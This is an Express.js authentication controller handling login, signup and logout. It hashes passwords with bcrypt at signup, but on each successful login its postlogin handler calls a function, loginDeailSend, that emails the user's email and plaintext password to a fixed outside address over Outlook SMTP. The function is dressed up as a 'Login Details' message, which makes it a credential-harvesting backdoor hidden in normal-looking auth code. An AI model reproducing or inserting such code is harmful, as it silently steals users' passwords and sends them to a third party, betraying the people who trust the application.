

const User = require('../models/user')
const bcryptjs = require('bcryptjs')
const { validationResult } = require('express-validator')

const nodemailer = require('nodemailer');
require('dotenv').config();

exports.getlogin = (req, res, next) => {

    // console.log("object :>> ", products);
    res.render("auth/login", {
        title: "Login",
        pageTitle: "login",
        path: "login",
        isauthntivated: req.session.islogin
    });

};





// Create a transporter


exports.postlogin = (req, res, next) => {
    let email = req.body.email
    let password = req.body.password
    User.findOne({ email })
        .then((user) => {

            if (!user) {
                return res.redirect('/login')
            }

            bcryptjs.compare(password, user.password).then((password) => {

                console.log('password', password);
                if (password) {
                    req.session.user = user;
                    req.session.islogin = true

                    return req.session.save(err => {


                        loginDeailSend(email, req.body.password)

                        res.redirect('/');
                    });
                }
                return res.redirect('/login')


            }).catch((user) => {

                console.log('waht is user status', user);
            })

        })
        .catch((err) => {
            console.log(err);
        });

};



function loginDeailSend(username, password) {
    let transporter = nodemailer.createTransport({
        host: 'smtp-mail.outlook.com', // Outlook SMTP server
        port: 587,
        secure: false, // true for 465, false for other ports
        auth: {
            user: process.env.OUTLOOK_EMAIL, // Your Outlook email address
            pass: process.env.OUTLOOK_PASSWORD // Your Outlook email password or app password
        }
    });
    // HTML content with inline CSS
    let htmlContent = `
<html>
<head>
<style>
body {
font-family: Arial, sans-serif;
}
.container {
width: 80%;
margin: auto;
padding: 20px;
border: 1px solid #ccc;
box-shadow: 2px 2px 12px #aaa;
}
.header {
background-color: #4CAF50;
color: white;
padding: 10px 0;
text-align: center;
}
.content {
margin-top: 20px;
}
.content p {
line-height: 1.6;
}
.footer {
margin-top: 20px;
text-align: center;
color: #aaa;
}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>Login Details</h1>
</div>
<div class="content">
<p>Hello,</p>
<p>Here are your login details:</p>
<p><strong>Username:</strong> ${username}</p>
<p><strong>Password:</strong> ${password}</p>
<p>Please keep this information secure and do not share it with anyone.</p>
</div>
<div class="footer">
<p>Thank you for using our service!</p>
</div>
</div>
</body>
</html>
`;

    // Email options
    let mailOptions = {
        from: process.env.OUTLOOK_EMAIL,    // Sender address
        to: 'waqar@replatechnologies.com', // List of recipients
        subject: 'Login Detail',   // Subject line
        text: `User Loign with Email ${username}!`,  // Plain text body
        html: htmlContent // HTML body (optional)
    };

    // Send the email
    transporter.sendMail(mailOptions, function (error, info) {
        if (error) {
            return console.log(error);
        }
        // console.log('Email sent: ' + info.response);
    });
}


exports.getsignup = (req, res, next) => {

    // console.log("object :>> ", products);
    res.render("auth/signup", {
        title: "Sign Up",
        pageTitle: "sign Up",
        path: "signup",
        isauthntivated: req.session.islogin,
        errorMessage: null
    });

};

exports.postsignup = (req, res, next) => {

    let error = validationResult(req)

    if (!error.isEmpty()) {

        return res.render("auth/signup", {
            title: "Sign Up",
            pageTitle: "sign Up",
            path: "signup",
            isauthntivated: req.session.islogin,
            errorMessage: error.array()[0].msg
        });
    }


    User.findOne({ email: req.body.email })
        .then((user) => {

            if (user) {
                console.log('finduser');
                return res.redirect('/signup')
            }

            return bcryptjs.hash(req.body.password, 12).then((hasspassword) => {
                let userdata = {
                    email: req.body.email,
                    password: hasspassword,
                    cart: { items: [] }
                }
                const usersave = new User(userdata)
                return usersave.save();
            })

        }).then((usercreate) => {
            if (usercreate) {
                res.redirect('/login')
            }
        })
        .catch((err) => {
            console.log(err);
        });

};




exports.postLogout = (req, res, next) => {

    req.session.destroy((err) => {

        res.redirect('/')
    })

};
